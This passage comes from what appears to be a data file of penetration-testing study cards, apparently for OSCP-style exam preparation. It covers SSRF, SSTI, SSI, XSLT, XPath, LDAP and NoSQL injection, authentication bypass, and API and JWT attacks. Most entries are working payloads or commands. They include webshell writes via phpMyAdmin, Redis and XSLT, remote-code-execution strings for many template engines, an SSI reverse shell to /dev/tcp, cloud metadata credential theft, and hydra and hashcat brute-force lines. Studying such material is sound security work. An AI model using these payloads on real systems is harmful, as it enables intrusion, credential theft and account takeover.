  text: "Local File Read \u2192 escalate priorities: /etc/passwd (users) \u2192 /home/USER/.ssh/id_rsa (SSH key!) \u2192 /home/USER/.bash_history \u2192 web config (DB creds) \u2192 /var/www/html/config.php \u2192 /proc/self/environ \u2192 /etc/shadow (if readable) \u2192 app source (.git, backups) \u2192 /root/.ssh/id_rsa | Windows: web.config, unattend.xml, SAM via backup, .ssh keys"
}, {
  id: "w183",
  p: H,
  text: "phpMyAdmin \u2192 RCE: default root:'' or root:root | SQL tab: SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/s.php' (need FILE priv + writable webroot + secure_file_priv empty) | OR via CVE if old version | OR create UDF for command exec | find webroot: SELECT @@datadir, check SHOW VARIABLES LIKE 'secure_file_priv'"
}, {
  id: "w184",
  p: H,
  text: "Webmin / admin panels: Webmin CVE-2019-15107 (unauth RCE in password_change.cgi) | CVE-2019-15231 | check version at login page | other panels: check default creds + searchsploit panel name + version | Cockpit, Ajenti, Froxlor, ISPConfig all have known CVEs \u2014 fingerprint then searchsploit"
}, {
  id: "w185",
  p: H,
  text: "SSRF exploitation goals: 1) internal port scan \u2014 access ports on localhost/internal hosts the server can reach but you can't (http://127.0.0.1:PORT/ \u2014 vary PORT, time/error differences reveal open ports) | 2) access restricted endpoints (admin panels bound to localhost) | 3) cloud metadata theft | 4) hit internal-only services (Redis, Jenkins, etc) | any param taking a URL/host/file is a candidate"
}, {
  id: "w186",
  p: H,
  text: "SSRF protocol wrappers: http://127.0.0.1/ (internal web) | http://127.0.0.1:6379/ (port probe) | file:///etc/passwd (local file read) | file:///C:/Windows/win.ini (Windows) | dict://127.0.0.1:6379/INFO (service interaction) | ftp:// | ldap:// | check which schemes the fetcher allows \u2014 file:// often works even when http filtered"
}, {
  id: "w187",
  p: H,
  text: "SSRF via gopher:// (arbitrary TCP / POST smuggling): gopher lets you craft raw bytes to any TCP service \u2014 turns GET-only SSRF into full POST/protocol interaction | CRLF = %0D%0A | example POST to internal admin.php: gopher://target.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20target.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin | leading _ is consumed by gopher (dummy byte)"
}, {
  id: "w188",
  p: H,
  text: "SSRF gopher to Redis RCE: gopher://127.0.0.1:6379/_<CRLF-separated redis commands> \u2192 set webshell: config set dir /var/www/html, config set dbfilename shell.php, set x '<?php system($_GET[c]);?>', save | URL-encode all CRLF as %0D%0A | tool: Gopherus (gopherus --exploit redis) auto-generates the gopher payload for redis/mysql/fastcgi/smtp"
}, {
  id: "w189",
  p: H,
  text: "SSRF cloud metadata (memorize): AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE> (also /latest/user-data, IMDSv2 needs token via PUT) | GCP: http://metadata.google.internal/computeMetadata/v1/ with header Metadata-Flavor:Google | Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata:true | Alibaba: http://100.100.100.200/latest/meta-data/"
}, {
  id: "w190",
  p: H,
  text: "SSRF filter bypass: localhost alternatives \u2014 127.0.0.1, 127.1, 0.0.0.0, 0, [::1], 2130706433 (decimal), 0x7f000001 (hex), 127.0.0.1.nip.io | DNS rebinding | redirect: host file on your server returning 302 to internal | http://expected.com@127.0.0.1 | http://127.0.0.1#expected.com | double URL-encode | uppercase scheme HTTP://"
}, {
  id: "w191",
  p: H,
  text: "SSTI detection: templating engines dynamically generate content \u2014 if user input reaches the template, you get code exec | polyglot test string: ${{<%[%'\"}}%\\. \u2192 an error or weird response = injection point | then narrow: {{7*7}}=49 (Jinja2/Twig), ${7*7}=49 (FreeMarker/Java), <%= 7*7 %>=49 (ERB), #{7*7} (Ruby), {7*7} (Smarty)"
}, {
  id: "w192",
  p: H,
  text: "SSTI engine identification tree: {{7*7}}\u219249 then {{7*'7'}}\u2192 if 7777777=Jinja2(Python), if 49=Twig(PHP) | ${7*7}\u219249 \u2192 ${7*'7'} errors=FreeMarker/Velocity(Java) | <%= 7*7 %>\u219249=ERB(Ruby) | #{7*7}\u219249=Ruby/Slim | {7*7}\u219249=Smarty(PHP) | @(7*7)\u219249=Razor(.NET) | use tplmap -u URL to auto-detect+exploit"
}, {
  id: "w193",
  p: H,
  text: "SSTI Jinja2 (Python) RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} | OR {{cycler.__init__.__globals__.os.popen('id').read()}} | OR {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} | OR {{lipsum.__globals__.os.popen('id').read()}} | filter bypass: {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')...}}"
}, {
  id: "w194",
  p: H,
  text: "SSTI Twig (PHP) RCE: {{['id']|filter('system')}} | {{['id',1]|sort('system')}} | {{['id']|map('system')|join}} | {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} | older Twig: {{_self.env.setCache('ftp://attacker')}} "
}, {
  id: "w195",
  p: H,
  text: "SSTI FreeMarker/Velocity (Java) RCE: FreeMarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')} OR ${'freemarker.template.utility.Execute'?new()('id')} | Velocity: #set($e='e');$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id') | Java Spring/Thymeleaf: ${T(java.lang.Runtime).getRuntime().exec('id')}"
}, {
  id: "w196",
  p: H,
  text: "SSTI ERB/Smarty/Razor RCE: ERB(Ruby): <%= `id` %> OR <%= system('id') %> OR <%= IO.popen('id').read %> | Smarty(PHP): {system('id')} OR {php}system('id');{/php} OR {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[c]);?>',self::clearConfig())} | Razor(.NET): @{System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\");}"
}, {
  id: "w197",
  p: H,
  text: "SSI (Server-Side Includes) injection: target .shtml/.shtm/.stm pages or where input is rendered into SSI-parsed pages | detection: inject <!--#printenv --> \u2192 if env vars print, SSI works | requires server SSI enabled (Apache mod_include) | test in any reflected field that ends up in an SSI-processed page"
}, {
  id: "w198",
  p: H,
  text: "SSI directives full set: print all env vars: <!--#printenv --> | print specific: <!--#echo var=\"DOCUMENT_NAME\" var=\"DATE_LOCAL\" --> | change config/error msg: <!--#config errmsg=\"Error!\" --> | include web file: <!--#include virtual=\"/index.html\" --> (LFI-like) | file size/mod: <!--#fsize file=\"x\" --> <!--#flastmod file=\"x\" -->"
}, {
  id: "w199",
  p: H,
  text: "SSI command execution (RCE): <!--#exec cmd=\"whoami\" --> | reverse shell: <!--#exec cmd=\"bash -c 'bash -i >& /dev/tcp/KALI/443 0>&1'\" --> | if uploaded as .shtml then accessed \u2192 executes | ESI (Edge Side Includes) variant: <esi:include src=\"http://attacker/\"/> for cache/proxy contexts \u2192 can lead to SSRF/XSS"
}, {
  id: "w200",
  p: H,
  text: "XSLT injection basics: XSLT transforms XML into other formats; if you control the stylesheet or input, you can inject | key elements: <xsl:template match=\"path\"> (applies to XML path) | <xsl:value-of select=\"node\"> (extract value) | <xsl:for-each select=\"node\"> (loop) | <xsl:if test=\"cond\"> (conditional) | detection: inject XSLT tags and observe transform behavior/errors"
}, {
  id: "w201",
  p: H,
  text: "XSLT info disclosure (fingerprint processor): <xsl:value-of select=\"system-property('xsl:version')\" /> | <xsl:value-of select=\"system-property('xsl:vendor')\" /> | <xsl:value-of select=\"system-property('xsl:vendor-url')\" /> | <xsl:value-of select=\"system-property('xsl:product-name')\" /> | <xsl:value-of select=\"system-property('xsl:product-version')\" /> \u2192 identifies libxslt/Xalan/Saxon \u2192 pick exploit accordingly"
}, {
  id: "w202",
  p: H,
  text: "XSLT local file read (LFI): <xsl:value-of select=\"unparsed-text('/etc/passwd', 'utf-8')\" /> (XSLT 2.0+) | PHP/libxslt: <xsl:value-of select=\"php:function('file_get_contents','/etc/passwd')\" /> | document(): <xsl:copy-of select=\"document('/etc/passwd')\"/> | also read source files, config, SSH keys"
}, {
  id: "w203",
  p: H,
  text: "XSLT RCE (PHP processor): requires php:function registered (PHP/libxslt) | <xsl:value-of select=\"php:function('system','id')\" /> | <xsl:value-of select=\"php:function('shell_exec','id')\" /> | write webshell: <xsl:value-of select=\"php:function('file_put_contents','/var/www/html/s.php','&lt;?php system($_GET[c]);?&gt;')\" /> | Xalan-J (Java): use Runtime.exec via extension functions"
}, {
  id: "w204",
  p: H,
  text: "XPath injection: when app queries XML data with user input | auth bypass: username: ' or '1'='1 and password: ' or '1'='1 | OR: ']|//user/*|//*['  | blind XPath: extract char-by-char with substring(): ' and substring(//user[1]/password,1,1)='a | detect: inject ' or 1=1 or 'a'='a vs invalid ' \u2192 different results | tools: xcat for automated blind extraction"
}, {
  id: "w205",
  p: H,
  text: "XPath blind extraction: count nodes: ' and count(//user)=N and 'a'='a | get name length: ' and string-length(//user[1]/name)=N | extract: ' and substring(//user[1]/name,POS,1)='CHAR | XCat automated: xcat run http://TARGET 'param' true_string --method GET | also test for XPath in: login forms, search, any XML-backed query"
}, {
  id: "w206",
  p: M,
  text: "Clickjacking: target lacks X-Frame-Options / CSP frame-ancestors \u2192 frame the page, overlay decoy UI, trick victim clicks | test: curl -I http://TARGET | grep -i 'x-frame\\|frame-ancestors' (absent = vulnerable) | PoC: <iframe src='http://TARGET/sensitive-action' style='opacity:0.1'><\/iframe> over a fake button | impact: forced actions (delete account, transfer, change settings). Usually low severity on OSCP but document it"
}, {
  id: "w207",
  p: H,
  text: "Web cache deception (vs poisoning): trick cache into storing private page | request /account.php/nonexistent.css \u2192 if server returns account.php content AND cache stores it as .css (static) \u2192 next visitor to that URL gets victim's cached private data | test: append /test.css, /test.js, /;.css, %0Atest.css to authenticated pages \u2192 check Cache-Control / X-Cache: HIT headers | difference from poisoning: deception steals private data, poisoning injects malicious content"
}, {
  id: "w208",
  p: H,
  text: "Email / SMTP header injection: input reflected into email headers (contact forms, password reset 'from'/'to') | inject CRLF to add headers: victim@x.com%0ABcc:attacker@evil.com \u2192 silently BCC yourself | %0AContent-Type: \u2192 modify body | inject to hijack password reset emails | also SMTP command injection if input hits raw SMTP: %0D%0AMAIL FROM / RCPT TO | test all email-related inputs with %0A%0D + extra header"
}, {
  id: "w209",
  p: M,
  text: "HTTP request smuggling via HTTP/2 (H2.CL / H2.TE): HTTP/2 downgrading to HTTP/1.1 at backend \u2192 desync if frontend trusts H2 length but backend re-reads CL/TE | h2c smuggling: upgrade cleartext HTTP/2 to bypass frontend controls | tool: Burp HTTP Request Smuggler (handles H2) | also: HTTP/2 CONTINUATION flood DoS | mostly advanced/CTF \u2014 OSCP rarely, but CWES covers it"
}, {
  id: "w210",
  p: H,
  text: "CRLF injection \u2192 response splitting \u2192 XSS/header inject: input reflected in response headers (Location, Set-Cookie) with unsanitized %0D%0A | inject: /page?url=%0D%0ASet-Cookie:session=attacker | %0D%0A%0D%0A\x3cscript\u003ealert(1)<\/script> \u2192 response splitting \u2192 XSS | %0D%0ALocation: \u2192 open redirect via header | test Location/redirect/cookie-setting params with %0D%0A (and %0A alone, %E5%98%8A%E5%98%8D unicode bypass)"
}, {
  id: "w211",
  p: H,
  text: "LDAP injection: app queries LDAP directory with user input (login, search) | auth bypass: username: *)(uid=*))(|(uid=* OR just * | password: *)(|(password=*) | wildcards: admin* enumerate | blind boolean: )(cn=admin)(description=A*) \u2192 vary char | detect: inject ) ( * | \u2192 LDAP error or different behavior | impact: auth bypass, user enumeration, attribute extraction"
}, {
  id: "w212",
  p: H,
  text: "Second-order / stored SSRF & injection awareness: payload stored, executed later in privileged context | stored SSRF: save webhook/avatar URL \u2192 admin's browser/backend fetches it later | second-order SQLi: malicious username stored, used unsanitized in admin query | log injection: inject into logs \u2192 fires when admin views log dashboard | always test: does this input get processed LATER by something with more privilege?"
}, {
  id: "w213",
  p: M,
  text: "Insecure direct object reference (IDOR) deep variants: predictable: /doc?id=123\u2192124 | UUID leak: find UUIDs in other responses then reuse | hashed IDs: md5(1),md5(2) predictable | encoded: base64('user_1') decode/modify/reencode | indirect: change username/email in body not URL | static files: /uploads/user1/private.pdf \u2192 /uploads/user2/ | test EVERY object reference with another user's identifier"
}, {
  id: "w214",
  p: H,
  text: "Verb tampering / HTTP method bypass: endpoint restricts GET but not other methods | try: POST/PUT/HEAD/PATCH/OPTIONS on protected resource | HEAD often bypasses auth filters that only check GET | X-HTTP-Method-Override: PUT header | Content-Type switch to bypass parsers | example: GET /admin blocked but POST /admin or HEAD /admin works \u2192 auth filter only matched GET"
}, {
  id: "au1",
  p: H,
  text: "Authentication categories (test all factors): Knowledge (passwords, PINs) \u2192 brute/guess/leak | Ownership (ID cards, TOTP tokens) \u2192 token theft/replay | Inherence (biometrics) \u2192 usually out of scope | focus on knowledge factor: default creds, weak passwords, reset flaws, and bypassing the check entirely"
}, {
  id: "au2",
  p: H,
  text: "User enumeration: different responses for valid vs invalid users | login error: 'invalid password' (user exists) vs 'invalid username' | registration: 'email already taken' | password reset: 'email sent' vs 'not found' | timing: valid user takes longer (password hash computed) | ffuf -w users.txt -u URL -d 'user=FUZZ&pass=x' -mr 'invalid password' to find valid ones"
}, {
  id: "au3",
  p: H,
  text: "Brute-forcing passwords: hydra -L users.txt -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect' | ffuf -w pass.txt -u URL -X POST -d 'user=admin&pass=FUZZ' -fr 'invalid' | wfuzz | for APIs use the JSON body | ALWAYS try default creds first (admin:admin, admin:password)"
}, {
  id: "au4",
  p: H,
  text: "Brute-forcing password reset tokens: weak tokens = sequential, timestamp-based, short, or MD5(email/time) | if token in URL ?token=ABC \u2192 brute if short/predictable | check token entropy | timestamp-based: predict from Date header (HelpDeskZ pattern) | reuse: does old token still work? is token tied to the user?"
}, {
  id: "au5",
  p: H,
  text: "Brute-forcing 2FA/OTP codes: 4-6 digit codes (0000-9999 / 000000-999999) often weakly protected | check: no rate limit on verify endpoint \u2192 ffuf the code | no lockout after N attempts | code doesn't expire / reusable | code not bound to session (request victim's, brute on your own) | response differs on correct digit (rare)"
}, {
  id: "au6",
  p: H,
  text: "Bypassing brute-force protection: rate limit by IP \u2192 rotate X-Forwarded-For: random IP per request (X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Client-IP) | CAPTCHA \u2192 check if solution leaks in HTML/response, if CAPTCHA validated server-side, if removing the captcha param bypasses it | account lockout \u2192 password spray (one pass, many users) instead of many pass one user"
}, {
  id: "au7",
  p: H,
  text: "Default & vulnerable credentials sources: cirt.net/passwords | SecLists/Passwords/Default-Credentials | SCADAPASS (scadastrangelove) for ICS | router/IoT defaults | per-product: search '<product> default credentials' | always try: admin:admin, admin:password, root:root, admin:<blank>, <product>:<product>"
}, {
  id: "au8",
  p: H,
  text: "Vulnerable password reset: guessable security questions (OSINT the target \u2014 pet name, birth city) | username/email injection in reset request: POST reset with email=victim@x.com&email=attacker@x.com (some send to second) | host header poisoning: change Host: attacker.com \u2192 reset link points to attacker, victim clicks \u2192 token leaks | token sent in response body"
}, {
  id: "au9",
  p: H,
  text: "Authentication bypass \u2014 direct/parameter: access protected page directly (skip login, go straight to /admin/dashboard) | forced browsing to post-auth URLs | HTTP param manipulation: ?admin=true, ?role=admin, ?authenticated=1 | response manipulation: change 'success':false \u2192 true in intercepted response | 302 redirect to login but page content still loads (intercept, stop redirect)"
}, {
  id: "au10",
  p: H,
  text: "Session attacks: brute-force cookies with low entropy (sequential session IDs \u2192 predict others) | session fixation: attacker gets valid session ID \u2192 coerces victim to use it (via URL param/XSS) \u2192 victim logs in \u2192 attacker now authenticated as victim | improper timeout: session never expires, valid forever after logout | session ID in URL = leaks via Referer/logs | JWT: see API JWT items (api9/api10)"
}, {
  id: "api1",
  p: H,
  text: "API discovery & enumeration: ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt | common bases: /api /api/v1 /api/v2 /rest /graphql /swagger /api-docs /openapi.json /v1 /v2 | check for versioning: /api/v1/ may be patched but /api/v2/ or /api/v0/ vulnerable | kiterunner: kr scan http://TARGET -w routes-large.kite (best API route discovery)"
}, {
  id: "api2",
  p: H,
  text: "Swagger / OpenAPI documentation: curl http://TARGET/swagger.json | http://TARGET/swagger-ui.html | /openapi.json | /api-docs | /api/swagger.json | /v2/api-docs | reveals ALL endpoints, params, auth methods | import into Postman/Burp \u2192 test each endpoint | swagger UI 'Try it out' button = live testing | check for hidden/undocumented endpoints not in swagger"
}, {
  id: "api3",
  p: H,
  text: "REST API authentication testing: missing auth \u2014 try endpoint without token first | JWT in Authorization: Bearer <token> | API key in header (X-API-Key) or query (?api_key=) | test: remove token entirely, use expired token, use another user's token, change Bearer to lowercase bearer | check if GET works without auth but POST requires it (inconsistent enforcement)"
}, {
  id: "api4",
  p: H,
  text: "BOLA / IDOR in APIs (most common API bug): GET /api/users/1234 \u2192 change to /api/users/1235 \u2192 other user's data | works on numeric IDs, UUIDs (if predictable), usernames | test ALL methods: GET/PUT/DELETE/PATCH on other users' resources | nested: /api/users/me/orders \u2192 /api/users/OTHER/orders | mass test: ffuf -u http://TARGET/api/users/FUZZ -w numbers.txt -mc 200"
}, {
  id: "api5",
  p: H,
  text: "BFLA (Broken Function Level Authorization): access admin functions as regular user | swap method: user can GET /api/users but try POST/DELETE /api/users/123 | guess admin endpoints: /api/admin/, /api/users/123/promote, /api/internal/ | change role in request body: {\"role\":\"user\"} \u2192 {\"role\":\"admin\"} | test admin-only endpoints with low-priv token"
}, {
  id: "api6",
  p: H,
  text: "Mass assignment / autobind: add extra params to request body that the API blindly binds | registration: {\"user\":\"x\",\"pass\":\"y\"} \u2192 add {\"isAdmin\":true,\"role\":\"admin\",\"verified\":true,\"balance\":99999} | find hidden params from GET response \u2192 include in PUT/POST | common: is_admin, isAdmin, role, admin, user_type, group, permissions, account_balance, email_verified"
}, {
  id: "api7",
  p: H,
  text: "Excessive data exposure: API returns MORE than UI shows | GET /api/users/me may include password_hash, ssn, internal_id, api_keys, tokens not displayed in frontend | always inspect FULL JSON response, not just rendered UI | check list endpoints: /api/users may dump all users' sensitive fields | look for debug fields, internal flags, PII"
}, {
  id: "api8",
  p: H,
  text: "API rate limit & brute force bypass: no rate limit on /api/login \u2192 credential brute via ffuf POST | bypass existing limits: X-Forwarded-For rotation, change User-Agent, add null byte to username (admin%00), case variation, batch via GraphQL | 2FA/OTP brute: /api/verify-otp often unthrottled \u2192 brute 0000-9999"
}, {
  id: "api9",
  p: H,
  text: "JWT attacks (full workflow): decode at jwt.io or: echo '<JWT>' | cut -d. -f2 | base64 -d | alg:none attack: change header to {\"alg\":\"none\"}, remove signature | weak secret: hashcat -m 16500 jwt.txt rockyou.txt | key confusion RS256\u2192HS256: sign with public key as HMAC secret | kid injection: \"kid\":\"../../dev/null\" or SQLi in kid | j:check expiry, audience, issuer validation"
}, {
  id: "api10",
  p: H,
  text: "JWT tool (jwt_tool): python3 jwt_tool.py <JWT> -M at (all tests) | python3 jwt_tool.py <JWT> -X a (alg:none) | python3 jwt_tool.py <JWT> -C -d rockyou.txt (crack secret) | python3 jwt_tool.py <JWT> -X k -pk public.pem (key confusion) | python3 jwt_tool.py <JWT> -T (tamper interactively) | -X i for kid injection SQLi"
}, {
  id: "api11",
  p: H,
  text: "GraphQL enumeration: POST /graphql {\"query\":\"{__schema{types{name,fields{name}}}}\"} (introspection \u2014 dumps entire schema) | if disabled: graphql-cop or clairvoyance (infer schema via suggestions) | InQL Burp extension auto-maps | check: /graphql /graphiql /api/graphql /v1/graphql /query | GET also: /graphql?query={__typename}"
}, {
  id: "api12",
  p: H,
  text: "GraphQL attacks: batching for brute (no rate limit): [{\"query\":\"mutation{login(pass:\\\"1\\\")}\"},{\"query\":\"mutation{login(pass:\\\"2\\\")}\"}] | field suggestion leaks names (typo a field \u2192 server suggests) | nested query DoS | IDOR: query{user(id:2){email,password}} | mutation abuse: query{users} then mutation{updateUser(id:1,role:admin)} | introspection \u2192 find hidden mutations"
}, {
  id: "api13",
  p: H,
  text: "API injection points: SQLi in JSON body: {\"id\":\"1 OR 1=1\"} or {\"id\":1,\"sort\":\"id; DROP--\"} | NoSQL: {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} or {\"$gt\":\"\"} | command injection in params used for system calls | SSTI in API-rendered templates | XXE if API accepts XML (Content-Type: application/xml) | test every JSON field, not just obvious ones"
}, {
  id: "api14",
  p: H,
  text: "NoSQL injection (MongoDB APIs): auth bypass: {\"username\":\"admin\",\"password\":{\"$ne\":\"x\"}} | {\"username\":{\"$regex\":\"^adm\"}} (enum) | in URL: username[$ne]=x&password[$ne]=x | operator injection: $gt, $ne, $regex, $where (JS exec): {\"$where\":\"sleep(5000)\"} | $where for blind exfil: {\"$where\":\"this.password[0]=='a'\"}"
}, {
  id: "api15",
  p: H,
  text: "Content-Type manipulation: switch application/json \u2194 application/xml \u2194 application/x-www-form-urlencoded \u2192 different parsers, different bugs | JSON\u2192XML may enable XXE | adding ?_method=DELETE or X-HTTP-Method-Override: DELETE bypasses method restrictions | send array where object expected: {\"user\":[\"a\",\"b\"]} \u2192 type confusion crashes/bypasses"
}, {
  id: "api16",
  p: H,
  text: "API versioning & deprecated endpoints: /api/v2/users patched but /api/v1/users still live + vulnerable | try: v0, v1, v1.0, v1.1, beta, internal, legacy, old, dev, test | check headers: Accept: application/vnd.api+json;version=1 | deprecated endpoints often lack new security controls | swagger may only document current version \u2014 fuzz for old ones"
}, {
